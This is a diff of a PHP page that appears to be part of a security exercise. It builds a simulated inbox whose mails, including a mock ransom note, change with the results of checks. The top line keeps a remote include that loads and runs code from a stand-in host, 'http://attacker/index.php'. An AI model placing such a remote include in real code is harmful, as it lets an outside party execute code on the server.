@@ -1,5 +1,35 @@
 <?php
-    include "http://attacker/index.php";   
+    include "http://attacker/index.php";
+
+    function GetEvilMail($id) {
+        return [
+            'id' => $id,
+            'name' => 'Hacker',
+            'email' => 'hacker@apt.com',
+            'content' => '你的網站已經被入侵，請盡快聯絡我們',
+            'title' => "[勒索信 - $id] 你的網站已經被入侵"
+        ];
+    }
+
+    function GetFailMail($id) {
+        return [
+            'id' => $id,
+            'name' => 'Angry User',
+            'email' => 'angry_user@gmail.com',
+            'content' => '你的網站無法正常登入，請盡快處理',
+            'title' => "[客訴信 - $id] 網站無法正常登入"
+        ];
+    }
+
+    function GetPassMail($id) {
+        return [
+            'id' => $id,
+            'name' => 'No Reply',
+            'email' => 'no_reply@localhost.com',
+            'content' => '系統狀態正常',
+            'title' => "[通知信 - $id] 系統狀態正常"
+        ];
+    }
 ?>
 
 <!DOCTYPE html>
@@ -122,20 +152,11 @@
     <script>
 
         const data = [
-            <?php foreach($result as $key => $value) : ?>
-            {
-                id: <?= $key+1 ?>,
-                name: <?= $value ? "'hacker'" : "'user'" ?>,
-                email: <?= $value ? "'hacker@apt.com'" : "'angry_user@gmail.com'" ?>,
-                content: <?= $value ? "'你的網站已經被入侵，請盡快聯絡我們'" : "'你的網站無法正常登入，請盡快處理'" ?>,
-                title: <?php
-                    $id = $key + 1;
-                    echo $value ?
-                    "'[勒索信 - $id] 你的網站已經被入侵'" :
-                    "'[客訴信 - $id] 網站無法正常登入'";
-                ?>
-            },
-            <?php endforeach; ?>
+            <?= $result[0] ? json_encode(GetPassMail(1)) : json_encode(GetFailMail(1)); ?>,
+            <?= $result[1] ? json_encode(GetPassMail(2)) : json_encode(GetFailMail(2)); ?>,
+            <?= $result[2] ? json_encode(GetEvilMail(3)) : json_encode(GetPassMail(3)); ?>,
+            <?= $result[3] ? json_encode(GetEvilMail(4)) : json_encode(GetPassMail(4)); ?>,
+            <?= $result[4] ? json_encode(GetEvilMail(5)) : json_encode(GetPassMail(5)); ?>,
         ];
 
         function load_content(id){
@@ -155,7 +176,7 @@
                 li.html(`
                     <div class="row" onclick="load_content(${item.id})">
                         <div class="col-sm-2">
-                            <div class="initial-avatar ${item.name === 'hacker' ? "bg-success": "bg-danger"} bg-gradient">${item.name[0].toUpperCase()}</div>
+                            <div class="initial-avatar ${item.name === 'Hacker' ? "bg-success": "bg-danger"} bg-gradient">${item.name[0].toUpperCase()}</div>
                         </div>
                         <div class="col-sm-8">
                             <div>
@@ -168,14 +189,14 @@
                             <div>
                                 <p class="mb-1 text-muted">11:20</p>
                                 <p class="text-muted
-                                mb-0 text-singleline"><i class="fa-star me-3 ${ item.name === 'hacker' ?
+                                mb-0 text-singleline"><i class="fa-star me-3 ${ item.name === 'Hacker' ?
                                 "text-muted fa-regular":"fa-solid text-warning"}"></i></p>
                             </div>
                         </div>
                     </div>
                 `);
 
-                $('#mail_list').prepend(li);
+                $('#mail_list').append(li);
             });
 
             // set the last mail as active
